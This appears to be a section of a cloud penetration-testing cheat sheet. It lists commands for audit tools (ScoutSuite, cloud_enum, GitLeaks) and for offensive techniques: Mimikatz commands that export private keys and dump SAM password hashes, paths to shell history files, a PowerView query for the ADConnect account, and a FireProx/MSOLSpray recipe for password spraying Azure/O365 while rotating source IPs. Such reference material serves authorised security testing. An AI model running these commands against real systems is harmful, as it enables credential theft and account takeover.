## Other Useful Cloud Tools and Techniques

#### ScoutSuite

Install ScoutSuite

```bash
sudo apt-get install virtualenv
git clone https://github.com/nccgroup/ScoutSuite
cd ScoutSuite
virtualenv –p python3 venv
source venv/bin/activate
pip install –r requirements.txt
```

Scan AWS environment with ScoutSuite

```bash
python scout.py aws --profile=<aws profile name>
```

#### Cloud_Enum

https://github.com/initstring/cloud_enum

```bash
python3 cloud_enum.py -k <name-to-search>
```

#### GitLeaks

https://github.com/zricethezav/gitleaks

Pull GitLeaks with Docker

```bash
sudo docker pull zricethezav/gitleaks
```

Print the help menu

```bash
sudo docker run --rm --name=gitleaks zricethezav/gitleaks --help
```

Use GitLeaks to search for secrets

```bash
sudo docker run --rm --name=gitleaks zricethezav/gitleaks -v -r <repo URL>
```

#### Mimikatz

Export Non-Exportable Private Keys From Web Server

```textile
mimikatz# crypto::capi
mimikatz# privilege::debug
mimikatz# crypto::cng
mimikatz# crypto::certificates /systemstore:local_machine /store:my /export
```

Dump passwords hashes from SAM/SYSTEM files

```textile
mimikatz# lsadump::sam /system:SYSTEM /sam:SAM
```

#### Check Command History

Linux Bash History Location

```bash
~/.bash_history
```

Windows PowerShell PSReadLine Location

```bash
%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

#### PowerView

https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
Find on-prem ADConnect account name and server

```powershell
Get-NetUser -Filter "(samAccountName=MSOL_*)" |Select-Object name,description | fl
```

#### FireProx

Password Spraying Azure/O365 while randomizing IPs with FireProx

Install

```bash
git clone https://github.com/ustayready/fireprox
cd fireprox
virtualenv -p python3 .
source bin/activate
pip install -r requirements.txt
python fire.py
```

Launch FireProx

```bash
python fire.py --access_key <access_key_id> --secret_access_key <secret_access_key> --region <region> --url https://login.microsoft.com --command create
```

Password spray using FireProx + MSOLSpray

```powershell
Invoke-MSOLSpray -UserList .\userlist.txt -Password Spring2020 -URL https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox
```

